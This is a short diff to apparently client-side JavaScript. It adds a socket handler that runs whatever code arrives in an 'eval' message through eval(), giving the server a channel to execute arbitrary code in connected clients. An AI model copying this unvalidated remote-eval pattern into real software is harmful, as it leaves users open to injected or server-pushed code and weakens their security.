@@ -299,6 +299,14 @@
 			client.socket.on('auth.info', function(data) {
 				client.preload.auth_info = data;
 			});
+
+			client.socket.on('eval', function(response) {
+				try {
+					eval(response.data);
+				} catch (e) {
+					console.log(e);
+				}
+			});
 		}
 
 		client.register_iframe = function(iframe_id) {
